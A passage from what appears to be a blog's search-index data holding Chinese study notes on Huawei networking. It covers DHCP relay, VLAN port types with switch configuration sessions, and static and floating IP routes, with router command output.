a few seconds. Please wait for a moment.done.[R1]int g0/0/1[R1-GigabitEthernet0/0/1]dhcp select ? global Local server interface Interface server pool relay DHCP relay[R1-GigabitEthernet0/0/1]dhcp select relay [R1-GigabitEthernet0/0/1]dhcp relay server-ip 12.1.1.2[R1-GigabitEthernet0/0/1] R2&lt;Huawei&gt;syEnter system view, return user view with Ctrl+Z.[Huawei]sy R2[R2]int g0/0/0[R2-GigabitEthernet0/0/0]ip add 12.1.1.2 24[R2-GigabitEthernet0/0/0]q[R2]ping 192.168.1.254 PING 192.168.1.254: 56 data bytes, press CTRL_C to break Request time out Request time out Request time out --- 192.168.1.254 ping statistics --- 3 packet(s) transmitted 0 packet(s) received 100.00% packet loss[R2]ip route-static 192.168.1.0 24 12.1.1.1[R2]ping 192.168.1.254 PING 192.168.1.254: 56 data bytes, press CTRL_C to break Reply from 192.168.1.254: bytes=56 Sequence=1 ttl=255 time=110 ms Reply from 192.168.1.254: bytes=56 Sequence=2 ttl=255 time=20 ms Reply from 192.168.1.254: bytes=56 Sequence=3 ttl=255 time=30 ms Reply from 192.168.1.254: bytes=56 Sequence=4 ttl=255 time=40 ms Reply from 192.168.1.254: bytes=56 Sequence=5 ttl=255 time=10 ms --- 192.168.1.254 ping statistics --- 5 packet(s) transmitted 5 packet(s) received 0.00% packet loss round-trip min/avg/max = 10/42/110 ms[R2]ip pool PC[R2-ip-pool-PC]network 192.168.1.0 mask 24[R2-ip-pool-PC]gateway-list 192.168.1.254[R2-ip-pool-PC]dns-list 114.114.114.114[R2-ip-pool-PC]lease day 0 hour 0 min 10[R2-ip-pool-PC]excluded-ip-address 192.168.1.100 192.168.1.253[R2-ip-pool-PC]dis th[V200R003C00]#ip pool PC gateway-list 192.168.1.254 network 192.168.1.0 mask 255.255.255.0 excluded-ip-address 192.168.1.100 192.168.1.253 lease day 0 hour 0 minute 10 dns-list 114.114.114.114 #return[R2-ip-pool-PC]q[R2]dhcp enable Info: The operation may take a few seconds. Please wait for a moment.done.[R2]int g0/0/0[R2-GigabitEthernet0/0/0]dhcp select global [R2-GigabitEthernet0/0/0] R1# sysname R1#dhcp enable#interface GigabitEthernet0/0/0 ip address 12.1.1.1 255.255.255.0 #interface GigabitEthernet0/0/1 ip address 192.168.1.254 255.255.255.0 dhcp select relay // 接口下开启 DHCP 中继功能 dhcp relay server-ip 12.1.1.2 // 告知中继中的DHCP服务器的IP地址# R2# sysname R2#dhcp enable#ip pool PC gateway-list 192.168.1.254 network 192.168.1.0 mask 255.255.255.0 excluded-ip-address 192.168.1.100 192.168.1.253 lease day 0 hour 0 minute 10 dns-list 114.114.114.114 #interface GigabitEthernet0/0/0 ip address 12.1.1.2 255.255.255.0 dhcp select global##ip route-static 192.168.1.0 255.255.255.0 12.1.1.1#"},{"title":"","date":"2023-12-19T06:00:00.000Z","updated":"2023-12-19T06:00:00.000Z","comments":true,"path":"notes/datacom/12.html","permalink":"https://blog.mhuig.top/notes/datacom/12","excerpt":"","text":"VLAN 原理与配置 VLAN 原理与配置 广播域过大造成的弊端交换机所处的位置是一个广播域. 1. 广播域的泛洪会导致网络传输效率降低. 2. 广播域过大可能会造成安全隐患. 3. 如果发生了故障很难排查. 4. 广播域过大会造成策略难以部署. 5. 会导致网络中带宽消耗过大. VLANVLAN: 虚拟局域网, 是在交换机上实现广播域隔离的一项二层技术, 每个 VLAN 就是一个广播域, VLAN 和设备的物理位置无关. 同一 VLAN 设备可以直接二层通信, 不同的 VLAN 设备相互隔离, 缺省情况下交换机属于同一个 VLAN. 不同的 VLAN 通过 VLAN 编号进行区分, VLAN 编号的取值范围 0-4095, 其中 0 和 4095 有特殊用处不能使用, 缺省 VLAN 为 1. VLAN Tag (802.1q) 数据帧源 MAC 地址和类型之间插入 VLAN Tag, 包含 VLAN ID. PVID 位于交换机接口. VLAN 的划分方式 1. 基于接口的划分: 根据交换机的接口编号来划分, 通过交换机的每一个接口配置不同的 PVID, 来将不同的接口划分到不同的 VLAN 中. 2. 基于 MAC 地址的划分. 3. 基于 IP 子网的划分. 4. 基于协议的划分. 5. 基于策略的划分. 接口Access接收当交换机收到一个没有 TAG 的数据帧时, 则接收该数据帧并根据 PVID 打上 VLANID. 当交换机接收到一个带有 TAG 的数据帧时, 当数据帧中的 VLANID 和 PVID 相同时, 接收, 不相同时, 不接收. 发送当交换机发送一个 VLANID 和 PVID 相同的数据帧时, 剥离数据帧的 TAG 发送. 当交换机发送一个 VLANID 和 PVID 不相同的数据帧时, 禁止数据帧发出. TRTUNK接收当交换机接收到一个不带 TAG 的数据帧时, 根据 PVID 打上 VLANID, 如果 VLANID 在允许放行的列表中, 则接收. 当交换机接收到一个带 TAG 的数据帧时, 查看 VLANID 是否允许通过列表里, 在则通过, 不在, 禁止通过. 发送当数据帧中 VLANID 和 PVID 相同, 该 VLANID 是否在允许通过列表中, 在则剥离 TAG 发送, 不在则丢弃. 当数据帧中 VLANID 和 PVID 不相同, 该 VLANID 是否在允许通过的列表中, 在则保留 TAG 发送, 不在则丢弃. Hybrid接收与 Trunk 端口类型一致. 发送如果该数据帧的 VLANID 不在允许通过列表中, 则禁止通过. 当数据帧的 VLANID 在允许通过列表中, 根据管理员指定该数据帧是否携带 TAG 通过. VLAN 命令Access Trunk SW1&lt;Huawei&gt;display port vlan Port Link Type PVID Trunk VLAN List-------------------------------------------------------------------------------GigabitEthernet0/0/1 hybrid 1 - GigabitEthernet0/0/2 hybrid 1 - GigabitEthernet0/0/3 hybrid 1 - GigabitEthernet0/0/4 hybrid 1 - GigabitEthernet0/0/5 hybrid 1 - GigabitEthernet0/0/6 hybrid 1 - GigabitEthernet0/0/7 hybrid 1 - GigabitEthernet0/0/8 hybrid 1 - GigabitEthernet0/0/9 hybrid 1 - GigabitEthernet0/0/10 hybrid 1 - GigabitEthernet0/0/11 hybrid 1 - GigabitEthernet0/0/12 hybrid 1 - GigabitEthernet0/0/13 hybrid 1 - GigabitEthernet0/0/14 hybrid 1 - GigabitEthernet0/0/15 hybrid 1 - GigabitEthernet0/0/16 hybrid 1 - GigabitEthernet0/0/17 hybrid 1 - GigabitEthernet0/0/18 hybrid 1 - GigabitEthernet0/0/19 hybrid 1 - GigabitEthernet0/0/20 hybrid 1 - GigabitEthernet0/0/21 hybrid 1 - GigabitEthernet0/0/22 hybrid 1 - GigabitEthernet0/0/23 hybrid 1 - GigabitEthernet0/0/24 hybrid 1 - &lt;Huawei&gt;&lt;Huawei&gt;syEnter system view, return user view with Ctrl+Z.[Huawei]vlan 10[Huawei-vlan10]q[Huawei]vlan 20[Huawei-vlan20]q[Huawei]undo vlan 10[Huawei]undo vlan 20[Huawei]vlan batch 10 20Info: This operation may take a few seconds. Please wait for a moment...done.[Huawei]vlan batch 10 to 20Info: This operation may take a few seconds. Please wait for a moment...done.[Huawei]int g0/0/1[Huawei-GigabitEthernet0/0/1]port link-type access[Huawei-GigabitEthernet0/0/1]port default vlan 10[Huawei-GigabitEthernet0/0/1]dis th#interface GigabitEthernet0/0/1 port link-type access port default vlan 10#return[Huawei-GigabitEthernet0/0/1]display port vlan Port Link Type PVID Trunk VLAN List-------------------------------------------------------------------------------GigabitEthernet0/0/1 access 10 - GigabitEthernet0/0/2 hybrid 1 - GigabitEthernet0/0/3 hybrid 1 - GigabitEthernet0/0/4 hybrid 1 - GigabitEthernet0/0/5 hybrid 1 - GigabitEthernet0/0/6 hybrid 1 - GigabitEthernet0/0/7 hybrid 1 - GigabitEthernet0/0/8 hybrid 1 - GigabitEthernet0/0/9 hybrid 1 - GigabitEthernet0/0/10 hybrid 1 - GigabitEthernet0/0/11 hybrid 1 - GigabitEthernet0/0/12 hybrid 1 - GigabitEthernet0/0/13 hybrid 1 - GigabitEthernet0/0/14 hybrid 1 - GigabitEthernet0/0/15 hybrid 1 - GigabitEthernet0/0/16 hybrid 1 - GigabitEthernet0/0/17 hybrid 1 - GigabitEthernet0/0/18 hybrid 1 - GigabitEthernet0/0/19 hybrid 1 - GigabitEthernet0/0/20 hybrid 1 - GigabitEthernet0/0/21 hybrid 1 - GigabitEthernet0/0/22 hybrid 1 - GigabitEthernet0/0/23 hybrid 1 - GigabitEthernet0/0/24 hybrid 1 - [Huawei-GigabitEthernet0/0/1][Huawei-GigabitEthernet0/0/1]int g0/0/3[Huawei-GigabitEthernet0/0/3]port link-type access[Huawei-GigabitEthernet0/0/3]port default vlan 10[Huawei-GigabitEthernet0/0/3]int g0/0/2[Huawei-GigabitEthernet0/0/2]port link-type access[Huawei-GigabitEthernet0/0/2]port default vlan 20[Huawei-GigabitEthernet0/0/2]int g0/0/4[Huawei-GigabitEthernet0/0/4]port link-type access[Huawei-GigabitEthernet0/0/4]port default vlan 20[Huawei]display port vlan Port Link Type PVID Trunk VLAN List-------------------------------------------------------------------------------GigabitEthernet0/0/1 access 10 - GigabitEthernet0/0/2 access 20 - GigabitEthernet0/0/3 access 10 - GigabitEthernet0/0/4 access 20 - GigabitEthernet0/0/5 hybrid 1 - GigabitEthernet0/0/6 hybrid 1 - GigabitEthernet0/0/7 hybrid 1 - GigabitEthernet0/0/8 hybrid 1 - GigabitEthernet0/0/9 hybrid 1 - GigabitEthernet0/0/10 hybrid 1 - GigabitEthernet0/0/11 hybrid 1 - GigabitEthernet0/0/12 hybrid 1 - GigabitEthernet0/0/13 hybrid 1 - GigabitEthernet0/0/14 hybrid 1 - GigabitEthernet0/0/15 hybrid 1 - GigabitEthernet0/0/16 hybrid 1 - GigabitEthernet0/0/17 hybrid 1 - GigabitEthernet0/0/18 hybrid 1 - GigabitEthernet0/0/19 hybrid 1 - GigabitEthernet0/0/20 hybrid 1 - GigabitEthernet0/0/21 hybrid 1 - GigabitEthernet0/0/22 hybrid 1 - GigabitEthernet0/0/23 hybrid 1 - GigabitEthernet0/0/24 hybrid 1 - [Huawei][Huawei]int g0/0/5[Huawei-GigabitEthernet0/0/5]port link-type trunk [Huawei-GigabitEthernet0/0/5]port trunk allow-pass vlan ? INTEGER&lt;1-4094&gt; VLAN ID all All[Huawei-GigabitEthernet0/0/5]port trunk allow-pass vlan 10 20[Huawei-GigabitEthernet0/0/5]dis this#interface GigabitEthernet0/0/5 port link-type trunk port trunk allow-pass vlan 10 20#return[Huawei-GigabitEthernet0/0/5]display port vlanPort Link Type PVID Trunk VLAN List-------------------------------------------------------------------------------GigabitEthernet0/0/1 access 10 - GigabitEthernet0/0/2 access 20 - GigabitEthernet0/0/3 access 10 - GigabitEthernet0/0/4 access 20 - GigabitEthernet0/0/5 trunk 1 1 10 20GigabitEthernet0/0/6 hybrid 1 - GigabitEthernet0/0/7 hybrid 1 - GigabitEthernet0/0/8 hybrid 1 - GigabitEthernet0/0/9 hybrid 1 - GigabitEthernet0/0/10 hybrid 1 - GigabitEthernet0/0/11 hybrid 1 - GigabitEthernet0/0/12 hybrid 1 - GigabitEthernet0/0/13 hybrid 1 - GigabitEthernet0/0/14 hybrid 1 - GigabitEthernet0/0/15 hybrid 1 - GigabitEthernet0/0/16 hybrid 1 - GigabitEthernet0/0/17 hybrid 1 - GigabitEthernet0/0/18 hybrid 1 - GigabitEthernet0/0/19 hybrid 1 - GigabitEthernet0/0/20 hybrid 1 - GigabitEthernet0/0/21 hybrid 1 - GigabitEthernet0/0/22 hybrid 1 - GigabitEthernet0/0/23 hybrid 1 - GigabitEthernet0/0/24 hybrid 1 - [Huawei-GigabitEthernet0/0/5][Huawei]int g0/0/5[Huawei-GigabitEthernet0/0/5]port trunk pvid vlan 10[Huawei-GigabitEthernet0/0/5]display port vlanPort Link Type PVID Trunk VLAN List-------------------------------------------------------------------------------GigabitEthernet0/0/1 access 10 - GigabitEthernet0/0/2 access 20 - GigabitEthernet0/0/3 access 10 - GigabitEthernet0/0/4 access 20 - GigabitEthernet0/0/5 trunk 10 1 10 20GigabitEthernet0/0/6 hybrid 1 - GigabitEthernet0/0/7 hybrid 1 - GigabitEthernet0/0/8 hybrid 1 - GigabitEthernet0/0/9 hybrid 1 - GigabitEthernet0/0/10 hybrid 1 - GigabitEthernet0/0/11 hybrid 1 - GigabitEthernet0/0/12 hybrid 1 - GigabitEthernet0/0/13 hybrid 1 - GigabitEthernet0/0/14 hybrid 1 - GigabitEthernet0/0/15 hybrid 1 - GigabitEthernet0/0/16 hybrid 1 - GigabitEthernet0/0/17 hybrid 1 - GigabitEthernet0/0/18 hybrid 1 - GigabitEthernet0/0/19 hybrid 1 - GigabitEthernet0/0/20 hybrid 1 - GigabitEthernet0/0/21 hybrid 1 - GigabitEthernet0/0/22 hybrid 1 - GigabitEthernet0/0/23 hybrid 1 - GigabitEthernet0/0/24 hybrid 1 - [Huawei-GigabitEthernet0/0/5]&lt;Huawei&gt;display cu#sysname Huawei#vlan batch 10 to 20#cluster enablentdp enablendp enable#drop illegal-mac alarm#diffserv domain default#drop-profile default#aaa authentication-scheme default authorization-scheme default accounting-scheme default domain default domain default_admin local-user admin password simple admin local-user admin service-type http#interface Vlanif1#interface MEth0/0/1#interface GigabitEthernet0/0/1 port link-type access port default vlan 10#interface GigabitEthernet0/0/2 port link-type access port default vlan 20#interface GigabitEthernet0/0/3 port link-type access port default vlan 10#interface GigabitEthernet0/0/4 port link-type access port default vlan 20#interface GigabitEthernet0/0/5 port link-type trunk port trunk pvid vlan 10 port trunk allow-pass vlan 10 20#interface GigabitEthernet0/0/6 SW2&lt;Huawei&gt;dis cu#sysname Huawei#vlan batch 10 20#interface GigabitEthernet0/0/1 port link-type trunk port trunk pvid vlan 10 port trunk allow-pass vlan 10 20#interface GigabitEthernet0/0/2 port link-type access port default vlan 10#interface GigabitEthernet0/0/3 port link-type access port default vlan 20#&lt;Huawei&gt; [Huawei]vlan batch 10 20 // 同时创建vlan 10 20[Huawei-GigabitEthernet0/0/x]port link-type access // 端口类型改为access[Huawei-GigabitEthernet0/0/x]port default vlan xx // 默认 vlan 为xx[Huawei-GigabitEthernet0/0/x]port link-type trunk // 端口类型改为trunk[Huawei-GigabitEthernet0/0/x]port trunk allow-pass vlan 10 20 // 允许通过列表 10 20[Huawei-GigabitEthernet0/0/x]port trunk pvid vlan 10 // 更改 pvid 为 VLAN10 Hybrid SW1&lt;Huawei&gt;syEnter system view, return user view with Ctrl+Z.[Huawei]sy SW1[SW1]vlan batch 10 20Info: This operation may take a few seconds. Please wait for a moment...done.[SW1]int g0/0/3[SW1-GigabitEthernet0/0/3]port hybrid pvid vlan 10[SW1-GigabitEthernet0/0/3]port hybrid untagged vlan 10[SW1-GigabitEthernet0/0/3]dis this #interface GigabitEthernet0/0/3 port hybrid pvid vlan 10 port hybrid untagged vlan 10#return[SW1-GigabitEthernet0/0/3]int g0/0/1[SW1-GigabitEthernet0/0/1]port link-type hybrid [SW1-GigabitEthernet0/0/1]port hybrid pvid vlan 10[SW1-GigabitEthernet0/0/1]port hybrid untagged vlan 10[SW1-GigabitEthernet0/0/3]int g0/0/2[SW1-GigabitEthernet0/0/2]port link-type hybrid [SW1-GigabitEthernet0/0/2]port hybrid pvid vlan 20[SW1-GigabitEthernet0/0/2]port hybrid untagged vlan 20[SW1-GigabitEthernet0/0/2]int g0/0/4[SW1-GigabitEthernet0/0/4]port link-type hybrid [SW1-GigabitEthernet0/0/4]port hybrid pvid vlan 20[SW1-GigabitEthernet0/0/4]port hybrid untagged vlan 20[SW1]int g0/0/5[SW1-GigabitEthernet0/0/5]port link-type hybrid [SW1-GigabitEthernet0/0/5]port hybrid ? pvid Specify current port's PVID VLAN characteristics tagged Tagged untagged Untagged vlan Virtual LAN[SW1-GigabitEthernet0/0/5]port hybrid tagged vlan 10 20[SW1-GigabitEthernet0/0/5]display port vlan Port Link Type PVID Trunk VLAN List-------------------------------------------------------------------------------GigabitEthernet0/0/1 hybrid 10 - GigabitEthernet0/0/2 hybrid 20 - GigabitEthernet0/0/3 hybrid 10 - GigabitEthernet0/0/4 hybrid 20 - GigabitEthernet0/0/5 hybrid 1 10 20GigabitEthernet0/0/6 hybrid 1 - GigabitEthernet0/0/7 hybrid 1 - GigabitEthernet0/0/8 hybrid 1 - GigabitEthernet0/0/9 hybrid 1 - GigabitEthernet0/0/10 hybrid 1 - GigabitEthernet0/0/11 hybrid 1 - GigabitEthernet0/0/12 hybrid 1 - GigabitEthernet0/0/13 hybrid 1 - GigabitEthernet0/0/14 hybrid 1 - GigabitEthernet0/0/15 hybrid 1 - GigabitEthernet0/0/16 hybrid 1 - GigabitEthernet0/0/17 hybrid 1 - GigabitEthernet0/0/18 hybrid 1 - GigabitEthernet0/0/19 hybrid 1 - GigabitEthernet0/0/20 hybrid 1 - GigabitEthernet0/0/21 hybrid 1 - GigabitEthernet0/0/22 hybrid 1 - GigabitEthernet0/0/23 hybrid 1 - GigabitEthernet0/0/24 hybrid 1 - [SW1-GigabitEthernet0/0/5]&lt;SW1&gt;display cu#sysname SW1#vlan batch 10 20#interface GigabitEthernet0/0/1 port hybrid pvid vlan 10 port hybrid untagged vlan 10#interface GigabitEthernet0/0/2 port hybrid pvid vlan 20 port hybrid untagged vlan 20#interface GigabitEthernet0/0/3 port hybrid pvid vlan 10 port hybrid untagged vlan 10#interface GigabitEthernet0/0/4 port hybrid pvid vlan 20 port hybrid untagged vlan 20#interface GigabitEthernet0/0/5 port hybrid tagged vlan 10 20# SW2&lt;Huawei&gt;syEnter system view, return user view with Ctrl+Z.[Huawei]sy SW2[SW2]vlan batch 10 20Info: This operation may take a few seconds. Please wait for a moment...done.[SW2][SW2]int g0/0/1[SW2-GigabitEthernet0/0/1]port hybrid tagged vlan 10 20[SW2-GigabitEthernet0/0/1]int g0/0/2[SW2-GigabitEthernet0/0/2]port link-type hybrid [SW2-GigabitEthernet0/0/2]port hybrid pvid vlan 10[SW2-GigabitEthernet0/0/2]port hybrid untagged vlan 10[SW2-GigabitEthernet0/0/2]int g0/0/3[SW2-GigabitEthernet0/0/3]port link-type hybrid [SW2-GigabitEthernet0/0/3]port hybrid pvid vlan 20[SW2-GigabitEthernet0/0/3]port hybrid untagged vlan 20&lt;SW2&gt;display cu#sysname SW2#vlan batch 10 20#interface GigabitEthernet0/0/1 port hybrid tagged vlan 10 20#interface GigabitEthernet0/0/2 port hybrid pvid vlan 10 port hybrid untagged vlan 10#interface GigabitEthernet0/0/3 port hybrid pvid vlan 20 port hybrid untagged vlan 20#"},{"title":"","date":"2023-12-20T06:00:00.000Z","updated":"2023-12-20T06:00:00.000Z","comments":true,"path":"notes/datacom/13.html","permalink":"https://blog.mhuig.top/notes/datacom/13","excerpt":"","text":"IP 路由基础 IP 路由基础 路由路由: 指导报文转发的路径信息, 通过路由可以确认 IP 报文的转发路径. 路由表: 路由信息库 (RIB) 每台路由器都维护着一张全局路由表, 另外路由器所运行的每种路由协议也维护着自己的路由表. 路由器可以通过多种途径获取路由信息, 获取的路由信息会先存储在协议自己的路由表中, 然后路由器根据协议的优先级等信息来进行路由优选, 并将优选路由加载到全局路由表中. 转发表: 转发信息库 (FIB) 数据包根据路由转发需要下一跳地址和出接口. 如果路由表中有匹配的路由条目, 则根据条目中的出接口或下一跳信息进行报文转发. 如果路由表内没有该路由信息, 则丢弃数据包. 路由表字段内容[R1]display ip routing-table Route Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public Destinations : 4 Routes : 4 Destination/Mask Proto Pre Cost Flags NextHop Interface 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0255.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0[R1] Destination / Mask: 目的和掩码. Protocol: 该路由通过哪种方式学习到的. Preference: 优先级, 当路由器通过不同方式学习到相同的路由时, 会比较不同协议之间的优先级, 优先级数值越小, 优先级越高. Cost: 开销, 到达目的网段所花费的开销, 路由信息通过不同的方式学习到的路由, 对于开销的计算方式也不同, 不同协议之间的开销没有可比性, 数据越小越优先. Flags: 标记, 标明当前路由的状态. D: 已经将该路由条目下载到转发表中. R: 迭代出的路由. NextHop: 下一跳, 标明数据从设备出发后, 应交给下一台哪个设备. Interface: 标明数据从该设备的哪个接口发送出去. 路由表的构建方式 (学习到路由的方式)1. 直连路由 (direct): 路由器直接相连的网络. 优先级 0. 1. 路由器的接口正确的配置了 IP 地址. 2. 接口的物理层状态为 UP. 2. 静态路由 (static): 由管理员手工添加的路由信息. 优先级 60. 1. 下一跳必须可达 (或出接口状态必须 UP). 2. 没有优先级更高的路由. 3. 动态路由: 路由器通过动态路由协议自动计算得到的路由. 可以根据网络变化自动的进行路由表的改变. 动态路由协议: OSPF, RIP, IS-IS, BGP. OSPF 优先级: 10 或 150, 协议号 89. RIP 优先级: 100, 端口号 520. 路由选路原则1. 如果一条路由是当前去往目的地的唯一路径信息, 则直接优选. 1.5. 最长掩码匹配原则. 2. 比较优先级, 不同的协议拥有不同的优先级, 优先级数据越小越优. 3. 比较路由开销, 越小越优. 4. 如果以上信息无法确定最优路径, 则会进行负载分担. 最长掩码匹配原则: 如果路由表中有两条目的网段相同的路由条目, 掩码越长 (所匹配的越多), 表示网段越精准, 所以掩码越长越优. 目的地: 192.168.1.1 路径: 192.168.1.0/24 192.168.1.0/16 192.168.1.0/29 (v) 20.1.0.0/16 OSPF 10 200 (v) 20.1.0.0/14 RIP 100 3 静态路由静态路由网络管理员手动配置, 配置方便, 对系统要求低, 适用于拓扑结构简单并且稳定的小型网络. 缺点是不能自动适应网络拓扑的变化需要人工干预. 静态路必须由网络管理员手动添加, 适用于小型网络或网络结构相对稳定的网络. 当网络拓扑发生改变时需要管理员手动进行调整. R1&lt;Huawei&gt;syEnter system view, return user view with Ctrl+Z.[Huawei] sy R1[R1]int g0/0/0[R1-GigabitEthernet0/0/0]ip add 192.168.1.254 24[R1-GigabitEthernet0/0/0]int g0/0/1[R1-GigabitEthernet0/0/1]ip add 12.1.1.1 24[R1-GigabitEthernet0/0/1]q[R1]display ip interface brief *down: administratively down^down: standby(l): loopback(s): spoofingThe number of interface that is UP in Physical is 3The number of interface that is DOWN in Physical is 1The number of interface that is UP in Protocol is 3The number of interface that is DOWN in Protocol is 1Interface IP Address/Mask Physical Protocol GigabitEthernet0/0/0 192.168.1.254/24 up up GigabitEthernet0/0/1 12.1.1.1/24 up up GigabitEthernet0/0/2 unassigned down down NULL0 unassigned up up(s) [R1]display ip routing-table Route Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public Destinations : 10 Routes : 10 Destination/Mask Proto Pre Cost Flags NextHop Interface 12.1.1.0/24 Direct 0 0 D 12.1.1.1 GigabitEthernet0/0/1 12.1.1.1/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 12.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0 192.168.1.0/24 Direct 0 0 D 192.168.1.254 GigabitEthernet0/0/0 192.168.1.254/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 192.168.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0255.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0[R1]ip route-static ? IP_ADDR&lt;X.X.X.X&gt; Destination IP address default-preference Preference-value for IPv4 static-routes selection-rule Selection rule vpn-instance VPN-Instance route information[R1]ip route-static 192.168.2.0 ? INTEGER&lt;0-32&gt; Length of IP address mask IP_ADDR&lt;X.X.X.X&gt; IP address mask[R1]ip route-static 192.168.2.0 24 ? IP_ADDR&lt;X.X.X.X&gt; Gateway address Cellular Cellular interface GigabitEthernet GigabitEthernet interface NULL NULL interface vpn-instance Destination VPN-Instance for Gateway address[R1]ip route-static 192.168.2.0 24 12.1.1.2[R1]dis th[V200R003C00]# sysname R1# snmp-agent local-engineid 800007DB03000000000000 snmp-agent # clock timezone China-Standard-Time minus 08:00:00#portal local-server load portalpage.zip# drop illegal-mac alarm# set cpu-usage threshold 80 restore 75#ip route-static 192.168.2.0 255.255.255.0 12.1.1.2#return[R1] R2&lt;Huawei&gt;syEnter system view, return user view with Ctrl+Z.[Huawei]sy R2[R2]int g0/0/1[R2-GigabitEthernet0/0/1]ip add 192.168.2.254 24[R2-GigabitEthernet0/0/1]int g0/0/0[R2-GigabitEthernet0/0/0]ip add 12.1.1.2 24[R2-GigabitEthernet0/0/0]dis ip int br*down: administratively down^down: standby(l): loopback(s): spoofingThe number of interface that is UP in Physical is 3The number of interface that is DOWN in Physical is 1The number of interface that is UP in Protocol is 3The number of interface that is DOWN in Protocol is 1Interface IP Address/Mask Physical Protocol GigabitEthernet0/0/0 12.1.1.2/24 up up GigabitEthernet0/0/1 192.168.2.254/24 up up GigabitEthernet0/0/2 unassigned down down NULL0 unassigned up up(s) [R2]ip route-static 192.168.1.0 24 12.1.1.1[R2]dis th[V200R003C00]# sysname R2# snmp-agent local-engineid 800007DB03000000000000 snmp-agent # clock timezone China-Standard-Time minus 08:00:00#portal local-server load portalpage.zip# drop illegal-mac alarm# set cpu-usage threshold 80 restore 75#ip route-static 192.168.1.0 255.255.255.0 12.1.1.1#return[R2] 等价路由具有相同的网络和掩码, 优先级以及开销值, 路由器认为多条路由完全等价, 则会将多条路由加入到路由表中, 实现负载均衡. 浮动路由在配置路由时, 使其中一条路由优先级高于其他路由, 从而实现路由的备份, 主路由失效的情况下, 路由器会将备份路由添加到路由表中. [R6]ip route-static 192.168.3.0 24 41.1.1.1 preference 70 R5&lt;R5&gt;syEnter system view, return user view with Ctrl+Z.[R5][R5][R5]int g4/0/0[R5-GigabitEthernet4/0/0]ip add 41.1.1.1 24Dec 21 2023 09:33:38-08:00 R5 %%01IFNET/4/LINK_STATE(l)[0]:The line protocol IP on the interface GigabitEthernet4/0/0 has entered the UP state. [R5-GigabitEthernet4/0/0]q[R5]ip rou [R5]ip route-s [R5]ip route-static 192.168.4.0 24 41.1.1.2[R5]dis ip rou [R5]dis ip routing-table Route Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public Destinations : 20 Routes : 21 Destination/Mask Proto Pre Cost Flags NextHop Interface 12.1.1.0/24 Static 60 0 RD 13.1.1.1 GigabitEthernet0/0/0 13.1.1.0/24 Direct 0 0 D 13.1.1.2 GigabitEthernet0/0/0 13.1.1.2/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 13.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 14.1.1.0/24 Direct 0 0 D 14.1.1.1 GigabitEthernet0/0/1 14.1.1.1/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 14.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 41.1.1.0/24 Direct 0 0 D 41.1.1.1 GigabitEthernet4/0/0 41.1.1.1/32 Direct 0 0 D 127.0.0.1 GigabitEthernet4/0/0 41.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet4/0/0 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0 192.168.1.0/24 Static 60 0 RD 13.1.1.1 GigabitEthernet0/0/0 192.168.2.0/24 Static 60 0 RD 13.1.1.1 GigabitEthernet0/0/0 192.168.3.0/24 Direct 0 0 D 192.168.3.254 GigabitEthernet0/0/2 192.168.3.254/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/2 192.168.3.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/2 192.168.4.0/24 Static 60 0 RD 14.1.1.2 GigabitEthernet0/0/1 Static 60 0 RD 41.1.1.2 GigabitEthernet4/0/0255.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0[R5]ip route-static 192.168.4.0 24 41.1.1.2 preference 40Info: Succeeded in modifying route.[R5]dis ip routing-tableRoute Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public Destinations : 20 Routes : 20 Destination/Mask Proto Pre Cost Flags NextHop Interface 12.1.1.0/24 Static 60 0 RD 13.1.1.1 GigabitEthernet0/0/0 13.1.1.0/24 Direct 0 0 D 13.1.1.2 GigabitEthernet0/0/0 13.1.1.2/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 13.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 14.1.1.0/24 Direct 0 0 D 14.1.1.1 GigabitEthernet0/0/1 14.1.1.1/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 14.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 41.1.1.0/24 Direct 0 0 D 41.1.1.1 GigabitEthernet4/0/0 41.1.1.1/32 Direct 0 0 D 127.0.0.1 GigabitEthernet4/0/0 41.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet4/0/0 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0 192.168.1.0/24 Static 60 0 RD 13.1.1.1 GigabitEthernet0/0/0 192.168.2.0/24 Static 60 0 RD 13.1.1.1 GigabitEthernet0/0/0 192.168.3.0/24 Direct 0 0 D 192.168.3.254 GigabitEthernet0/0/2 192.168.3.254/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/2 192.168.3.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/2 192.168.4.0/24 Static 40 0 RD 41.1.1.2 